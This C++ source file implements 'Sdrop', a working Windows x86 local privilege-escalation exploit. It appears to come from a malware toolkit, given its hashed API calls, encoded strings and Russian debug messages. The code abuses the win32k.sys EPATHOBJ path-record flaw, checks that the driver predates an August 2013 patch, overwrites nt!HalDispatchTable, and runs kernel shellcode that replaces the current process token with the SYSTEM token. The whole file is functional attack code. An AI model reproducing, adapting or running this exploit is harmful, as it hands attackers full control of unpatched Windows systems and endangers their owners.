#include "core\core.h"
#include "core\elevation.h"
#include "core\debug.h"
#include "core\misc.h"
#include "core\version.h"
#include "core\file.h"

namespace Elevation
{

#ifndef _WIN64

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define PAGE_SIZE 0x1000
#define MAX_BITMAPS 8192
// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

#define MAX_PT_NUM 498
#define MAX_POLYPOINTS 64*MAX_PT_NUM

const uint hashHalDispatchTable = 0x02d4f985;

typedef struct  _POINTFIX
{
	ULONG x;
	ULONG y;
} POINTFIX, *PPOINTFIX;

typedef struct _PATHRECORD *PPATHRECORD;

typedef struct _PATHRECORD
{
	PPATHRECORD			next;
	PPATHRECORD			prev;
	ULONG               flags;
	ULONG               count;
	POINTFIX            points[4];
} PATHRECORD, *PPATHRECORD;

typedef struct _KPROCESS *PEPROCESS;
typedef PACCESS_TOKEN ( NTAPI *PSREFERENCEPRIMARYTOKEN )( PEPROCESS Process	);
typedef NTSTATUS(NTAPI *PSLOOKUPPROCESSBYPROCESSID)( HANDLE ProcessId, PEPROCESS *Process );

ULONG g_ulHalDispatchTable;
PEPROCESS* g_ppPsInitialSystemProcess;
PSREFERENCEPRIMARYTOKEN	PsReferencePrimaryToken;
PSLOOKUPPROCESSBYPROCESSID PsLookupProcessByProcessId;
ULONG g_ulHalQuerySystemInformation;
PULONG g_pulDispatchRedirect;
ULONG g_ulTargetPid;
bool g_bShellExecuted;

static SYSTEM_MODULE_INFORMATION* GetInfoTable(SYSTEM_INFORMATION_CLASS ATableType, SYSTEM_INFO& systemInfo )
{
	ULONG size = systemInfo.dwAllocationGranularity;
	SYSTEM_MODULE_INFORMATION* ptr = nullptr;
	NTSTATUS st;
	ULONG rounds = 100;

	while( rounds-- )
	{
		ptr = (SYSTEM_MODULE_INFORMATION*)Mem::Alloc(size);
		if( !ptr ) return nullptr;
		Mem::Set( ptr, 0, size );
		st = API(NTDLL, NtQuerySystemInformation)( ATableType, ptr, size, nullptr ); 
		if( NT_SUCCESS(st) ) 
			return ptr;
		else
		{
			Mem::Free(ptr);
			if( st == STATUS_INFO_LENGTH_MISMATCH )
				size *= 2;
			else
				break;
		}
	};
	return nullptr;
}

ULONG FindHalQuerySystemInformation( PBYTE halBaseMapped, ULONG halImageBase, NT_VERSION ver )
{
	if( !halBaseMapped || (((PIMAGE_DOS_HEADER)(halBaseMapped))->e_magic) != IMAGE_DOS_SIGNATURE )
		return 0;

	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(halBaseMapped + ((PIMAGE_DOS_HEADER)halBaseMapped)->e_lfanew);
	if( !pe || pe->Signature != IMAGE_NT_SIGNATURE )
		return 0;

	ULONG halImageSize = pe->OptionalHeader.SizeOfImage;
	ULONG peImageBase = pe->OptionalHeader.ImageBase;
	PBYTE currSearchPoint = halBaseMapped;
	PBYTE endOfSearch = halBaseMapped + halImageSize;
	ULONG halDispatchTableVA = (ULONG)WinAPI::GetImportAddr( (HMODULE)halBaseMapped, hashHalDispatchTable, &pe->OptionalHeader );
	PBYTE movEaxHalDispatchTableEndAddr = nullptr;

	if( halDispatchTableVA ) 
	{
		ULONG lsignPosition;
		if( ver >= MICROSOFT_WINDOWS_8_SP0 )
			lsignPosition = 3;
		else
			lsignPosition = 1;

		while( currSearchPoint < endOfSearch )
		{
			currSearchPoint = (PBYTE)Mem::Find( (char*)currSearchPoint, (byte)0xA1, endOfSearch - currSearchPoint );
			if( !currSearchPoint ) break;
			ULONG testDword = *(PULONG)(currSearchPoint + 1);
			if( testDword == halDispatchTableVA && --lsignPosition == 0)
			{
				movEaxHalDispatchTableEndAddr = currSearchPoint + 5;
				break;
			}
			currSearchPoint++;
		}

		if( movEaxHalDispatchTableEndAddr )
		{
			byte what[2];
			what[0] = 0xC7;
			what[1] = 0x40;
			int i = Mem::IndexOf( currSearchPoint, 0x400, what, 2 );
			if( i >= 0 ) 
			{
				ULONG haliQuerySystemInformation = *(PULONG)(currSearchPoint + 3);				
				if( haliQuerySystemInformation )
				{
					haliQuerySystemInformation = haliQuerySystemInformation - (ULONG)halBaseMapped + halImageBase;
					return haliQuerySystemInformation;
				}

			}
		}
	}
	DbgMsg( "HalQuerySystemInformation not found. Look for <retn 10h> byte sequence address");

	//In the case HaliQuerySystemInformation signature was not found looking for C2 10 00  (retn 10h) byte sequence address
	byte what[3];
	what[0] = 0xC2;
	what[1] = 0x10;
	what[2] = 0x00;
	int p = Mem::IndexOf( halBaseMapped, halImageSize, what, 3 );
	if( p >= 0 )
		return halImageBase + p;
	return 0;
}

void __declspec(naked) HalDispatchRedirect()
{

	__asm jmp dword ptr [ebp+0x40]; //  0
	__asm inc eax
	__asm jmp dword ptr [ebp+0x40]; //  1
	__asm inc ecx
	__asm jmp dword ptr [ebp+0x40]; //  2
	__asm inc edx
	__asm jmp dword ptr [ebp+0x40]; //  3
	__asm inc ebx
	__asm jmp dword ptr [ebp+0x40]; //  4
	__asm inc esi
	__asm jmp dword ptr [ebp+0x40]; //  5
	__asm inc edi
	__asm jmp dword ptr [ebp+0x40]; //  6
	__asm dec eax
	__asm jmp dword ptr [ebp+0x40]; //  7
	__asm dec ecx
	__asm jmp dword ptr [ebp+0x40]; //  8
	__asm dec edx
	__asm jmp dword ptr [ebp+0x40]; //  9
	__asm dec ebx
	__asm jmp dword ptr [ebp+0x40]; // 10
	__asm dec esi
	__asm jmp dword ptr [ebp+0x40]; // 11
	__asm dec edi
	// Mark end of table.
	__asm 
	{
		_emit 0
		_emit 0
		_emit 0
		_emit 0
	}
}

void PressKernelMem( int& numBitmaps, int& maxBitmaps, HBITMAP*& bitmaps )
{
	numBitmaps = 0;
	HDC hdc = API(GDI32, CreateCompatibleDC)(nullptr);

	for( unsigned size = 1 << 26; size; size >>= 1) 
	{
		while( bitmaps[numBitmaps] = API(GDI32, CreateCompatibleBitmap)( hdc, size, size ) )
		{
			numBitmaps++;
			if( numBitmaps >= maxBitmaps )
			{
				maxBitmaps *= 2;
				bitmaps = (HBITMAP*) Mem::Realloc( bitmaps, sizeof(HBITMAP) * maxBitmaps );
			}
		}
	}
	DbgMsg( "allocated %u HBITMAP objects", numBitmaps );
}


void FreeKernelMem( int& numBitmaps, HBITMAP* bitmaps )
{
	/* Free memory: Let the kernel breath. */
	while( numBitmaps )
		API(GDI32, DeleteObject)( bitmaps[--numBitmaps] );
}

// Search the specified data structure for a member with CurrentValue.
bool FindAndReplaceProcessToken( PDWORD structure, DWORD currentValue, DWORD newValue, DWORD maxSize )
{
	DWORD i, mask;

	// Microsoft QWORD aligns object pointers, then uses the lower three
	// bits for quick reference counting.
	mask = ~7;

	// Mask out the reference count.
	currentValue &= mask;

	// Scan the structure for any occurrence of CurrentValue.
	for( i = 0; i < maxSize; i++ )
	{
		if( (structure[i] & mask) == currentValue) {
			// And finally, replace it with NewValue.
			structure[i] = newValue;
			return true;
		}
	}
	// Member not found.
	return false;
}

// This routine is injected into nt!HalDispatchTable by EPATHOBJ::pprFlattenRec.
ULONG __stdcall ShellCode( DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4 )
{
	PEPROCESS  targetProcess;

	// Record that the exploit completed.
	g_bShellExecuted = true;

	// Fix the corrupted HalDispatchTable,
	*(PULONG)(g_ulHalDispatchTable + 4) = g_ulHalQuerySystemInformation;

	// Find the EPROCESS structure for the process I want to escalate
	if( PsLookupProcessByProcessId( (HANDLE)g_ulTargetPid, &targetProcess ) == STATUS_SUCCESS ) 
	{
		PACCESS_TOKEN systemToken;
		PACCESS_TOKEN targetToken;

		// Find the Token object for my target process, and the SYSTEM process.
		targetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(targetProcess);
		systemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*g_ppPsInitialSystemProcess);

		// Find the token in the target process, and replace with the system token.
		FindAndReplaceProcessToken((PDWORD) targetProcess, (DWORD)targetToken, (DWORD)systemToken, 0x300 );
	}
	return 0;
}


bool ExecuteExploit()
{
	HBITMAP* bitmaps = (HBITMAP*)Mem::Alloc( sizeof(HBITMAP) * MAX_BITMAPS );
	if( !bitmaps ) return false;

	PPATHRECORD exploitRecordExit;
	// This PATHRECORD must terminate the list and recover.
	exploitRecordExit = (PPATHRECORD)*g_pulDispatchRedirect;
	exploitRecordExit->next = nullptr;
	exploitRecordExit->prev = nullptr;
	exploitRecordExit->flags = PD_BEGINSUBPATH;
	exploitRecordExit->count = 0;

	PATHRECORD exploitRecord;
	Mem::Zero(exploitRecord);
	exploitRecord.next = exploitRecordExit;
	exploitRecord.prev = (PPATHRECORD)(g_ulHalDispatchTable + 4);
	exploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;
	exploitRecord.count = 4;

	PPATHRECORD pathRecord = (PPATHRECORD)API(KERNEL32, VirtualAlloc)( NULL, sizeof(PATHRECORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	DbgMsg( "Alllocated userspace PATHRECORD () %p", pathRecord);

	// Initialise with recognisable debugging values.
	Mem::Set( pathRecord, 0xCC, sizeof(PATHRECORD) );

	/* Craft PATHRECORD structures. */
	pathRecord->next = &exploitRecord;
	pathRecord->prev = 0;
	// You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
	// EPATHOBJ::bFlatten(), do that here.
	//g_pPathRecord->flags = PD_BEZIERS;
	pathRecord->flags = 0;

	// Generate a large number of Bezier Curves made up of pointers to our
	// PATHRECORD object.
	POINT* points = (POINT*)Mem::Alloc( sizeof(POINT) * MAX_POLYPOINTS );
	if( points )
	{
		BYTE* pointTypes = (BYTE*)Mem::Alloc(MAX_POLYPOINTS);
		if( pointTypes )
		{
			for( int i = 0; i < MAX_POLYPOINTS; i++ )
			{ 
				points[i].x = (ULONG)(pathRecord) >> 4;
				points[i].y = (ULONG)(pathRecord) >> 4;
				pointTypes[i] = PT_BEZIERTO;
			}
			HDC	expDev = API(USER32, GetDC)(nullptr), tmpDc = nullptr;
			int maxBitmaps = MAX_BITMAPS;
			int numBitmaps = 0;
			for( int i = 63; i > 0; i-- )
			{
				if( !tmpDc ) 
				{
					API(GDI32, BeginPath)(expDev);
					API(GDI32, PolyDraw)( expDev, points, pointTypes, MAX_PT_NUM );
					API(GDI32, EndPath)(expDev);

					API(GDI32, BeginPath)(expDev);
					API(GDI32, PolyDraw)( expDev, points, pointTypes, MAX_PT_NUM - 15 );
					API(GDI32, EndPath)(expDev); 

					tmpDc = API(GDI32, CreateCompatibleDC)(expDev);
					API(GDI32, BeginPath)(tmpDc);
				}

				if( API(GDI32, PolyDraw)( tmpDc, points, pointTypes, MAX_PT_NUM * i ) )
				{
					API(GDI32, EndPath)(tmpDc);
					PressKernelMem( numBitmaps, maxBitmaps, bitmaps );
					API(GDI32, FlattenPath)(expDev);
					FreeKernelMem( numBitmaps, bitmaps );
					API(GDI32, FlattenPath)(expDev);

					// Run shell code.
					PBYTE shellTrampoline = (PBYTE)API(KERNEL32, VirtualAlloc)( NULL, 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
					shellTrampoline[0] = 0xE9;
					*(PULONG)&shellTrampoline[1] = (ULONG)ShellCode - (ULONG)shellTrampoline - 5;

					g_bShellExecuted = false;
					API(NTDLL, NtQueryIntervalProfile)( ProfileTotalIssues, (PULONG)shellTrampoline );
					API(KERNEL32, VirtualFree)( shellTrampoline, 0, MEM_RELEASE );
					API(GDI32, DeleteDC)(tmpDc);
					tmpDc = nullptr;
					if( g_bShellExecuted )
					{
						DbgMsg( "Shell code executed" );
						break;
					}
					Delay(100);
				}
				else
					API(GDI32, EndPath)(tmpDc);
			}
			Mem::Free(pointTypes);
		}
		Mem::Free(points);
	}
	API(KERNEL32, VirtualFree)(pathRecord, 0, MEM_RELEASE );
	Mem::Free(bitmaps);
	return g_bShellExecuted;
}

#endif

bool Sdrop( const char* nameExe )
{
	DbgMsg( "Elevation 'Sdrop'" );

#ifdef _WIN64
	return false;
#else
	WindowsVersion wv;
	if(!GetWindowsVersion(wv) ) return false;
	DbgMsg( "OS version: %s", DECODE_STRING( NT_VERSION_NAMES[wv.idVer] ) );

	if( wv.architecture == Sys64bit )
	{
		DbgMsg( "Этот elevation только для x86" );
		return false;
	}

	StringBuilder pathWin32k;
	Path::GetCSIDLPath( CSIDL_SYSTEM, pathWin32k, _CS_("win32k.sys") );
	HANDLE hWin32k = File::Open( pathWin32k, GENERIC_READ, OPEN_EXISTING );
	if( hWin32k )
	{
		FILETIME ft;
		API(KERNEL32, GetFileTime)( hWin32k, &ft, 0, 0 );
		File::Close(hWin32k);
		SYSTEMTIME st;
		API(KERNEL32, FileTimeToSystemTime)( &ft, &st );
		uint date = st.wYear * 10000 + st.wMonth * 100 + st.wDay;
		if( date >= 20130829 )
		{
			DbgMsg( "Дата файла win32k.sys больше 29.08.2013, сплойт не сработает" );
			return false;
		}
		DbgMsg( "Дата файла win32k.sys меньше 29.08.2013, продолжаем выполнять сплойт" );
	}

	SYSTEM_MODULE_INFORMATION* modules = (SYSTEM_MODULE_INFORMATION*)GetInfoTable( SystemModuleInformation, wv.systemInfo );
	if( !modules ) 
	{
		DbgMsg( "GetInfoTable() Error!" );
		return false;
	}

	char cNtOsName[20], cHalName[20];
	Str::Copy( cNtOsName, &modules->aSM[0].ImageName[modules->aSM[0].ModuleNameOffset] );
	ULONG ulNtOsBase = modules->aSM[0].Base;

	Str::Copy( cHalName, &modules->aSM[1].ImageName[modules->aSM[1].ModuleNameOffset] );
	ULONG ulHalBase = modules->aSM[1].Base;

	DbgMsg( "NT OS module: '%s' [0x%08X]", cNtOsName, ulNtOsBase);
	DbgMsg( "HAL module: '%s' [0x%08X]\n", cHalName, ulHalBase);

	Mem::Free(modules);

	HMODULE hNtOs = API(KERNEL32, LoadLibraryExA)( cNtOsName, NULL,DONT_RESOLVE_DLL_REFERENCES );

	ULONG ulHalDispatchTableMapped = (ULONG)API(KERNEL32, GetProcAddress)( hNtOs, _CS_("HalDispatchTable") );
	ULONG ulPsInitialSystemProcessMapped = (ULONG)API(KERNEL32, GetProcAddress)( hNtOs, _CS_("PsInitialSystemProcess") );
	ULONG ulPsReferencePrimaryTokenMapped = (ULONG)API(KERNEL32, GetProcAddress)( hNtOs, _CS_("PsReferencePrimaryToken") );
	ULONG ulPsLookupProcessByProcessIdMapped = (ULONG)API(KERNEL32, GetProcAddress)( hNtOs, _CS_("PsLookupProcessByProcessId") );

	if( !ulHalDispatchTableMapped || !ulPsInitialSystemProcessMapped || !ulPsReferencePrimaryTokenMapped || !ulPsLookupProcessByProcessIdMapped )
	{
		DbgMsg( "Error! Kernel procedures addresses was not resolved." );
		return false;
	}

	ULONG ulDelta = ulNtOsBase - (ULONG)hNtOs;
	g_ulHalDispatchTable = ulHalDispatchTableMapped + ulDelta;
	g_ppPsInitialSystemProcess = (PEPROCESS*)(ulPsInitialSystemProcessMapped + ulDelta);
	PsReferencePrimaryToken = (PSREFERENCEPRIMARYTOKEN)(ulPsReferencePrimaryTokenMapped + ulDelta);
	PsLookupProcessByProcessId = (PSLOOKUPPROCESSBYPROCESSID)(ulPsLookupProcessByProcessIdMapped + ulDelta);

	HMODULE	hHal = API(KERNEL32, LoadLibraryExA)( cHalName, NULL, DONT_RESOLVE_DLL_REFERENCES );
	if( !hHal )
	{
		DbgMsg( "Can't open hal lib [%s] Error: %d\n", cHalName, API(KERNEL32, GetLastError)() );
		return false;
	}

	ULONG halDispatchTableMappedHal= (ULONG)API(KERNEL32, GetProcAddress)( hHal, _CS_("HalDispatchTable") );

	g_ulHalQuerySystemInformation = FindHalQuerySystemInformation( (PBYTE)hHal, ulHalBase, wv.idVer );
	if( !g_ulHalQuerySystemInformation )
	{
		DbgMsg( "HalQuerySystemInformation not found" );
		return false;
	}

	DbgMsg( "PsInitialSystemProcess: 0x%08X\n", g_ppPsInitialSystemProcess );
	DbgMsg( "PsReferencePrimaryToken: 0x%08X\n", PsReferencePrimaryToken );
	DbgMsg( "PsLookupProcessByProcessId: 0x%08X\n", PsLookupProcessByProcessId );
	DbgMsg( "HalDispatchTable: 0x%08X\n", g_ulHalDispatchTable );
	DbgMsg( "HalQuerySystemInformation: 0x%08X\n", g_ulHalQuerySystemInformation );

	DbgMsg( "Searching for an available stub address..." );

	// I need to map at least two pages to guarantee the whole structure is
	// available.
	g_pulDispatchRedirect = (PULONG)HalDispatchRedirect;
	while( !API(KERNEL32, VirtualAlloc)( PVOID(*g_pulDispatchRedirect & ~(PAGE_SIZE - 1)), PAGE_SIZE * 2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) 
	{
		DbgMsg( "VirtualAlloc(%#x) => %#x",	*g_pulDispatchRedirect & ~(PAGE_SIZE - 1),	API(KERNEL32, GetLastError)() );

		// This page is not available, try the next candidate.
		if (!*++g_pulDispatchRedirect) 
		{
			DbgMsg( "No redirect candidates left, sorry!" );
			return false;
		}
	}

	DbgMsg( "Found redirect memory: %#0x", *g_pulDispatchRedirect );
	DbgMsg( "Starting exploitation, wait 10-15 sec ..." );

	bool ret = false;
/*
	HANDLE hprocess;
	HANDLE hthread;
	if( Process::Exec( NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED, &hprocess, &hthread, 0, 0, nameExe ) )
	{
		g_ulTargetPid = API(KERNALE32, GetProcessId)(hprocess);

		DbgMsg( "Target PID: %u", g_ulTargetPid );

		if( ExecuteExploit() || ExecuteExploit() )
		{
			DbgMsg( "Got system privileges!" );
			API(KERNEL32, ResumeThread)(hthread);
			ret = true;
		}
		else
		{
			//Process::Kill( g_ulTargetPid, 5000 );
			API(KERNEL32, TerminateThread)( hthread, 0 );
			DbgMsg( "Exploit was not triggered :(" );
		}
		API(KERNEL32, CloseHandle)(hthread);
		API(KERNEL32, CloseHandle)(hprocess);

	}
*/
	g_ulTargetPid = Process::CurrentPID();
	DbgMsg( "Target PID: %u", g_ulTargetPid );
	if( ExecuteExploit() || ExecuteExploit() )
	{
		DbgMsg( "Got system privileges!" );
		//Process::Exec(nameExe);
		ret = true;
	}

	return ret;
#endif
}

}
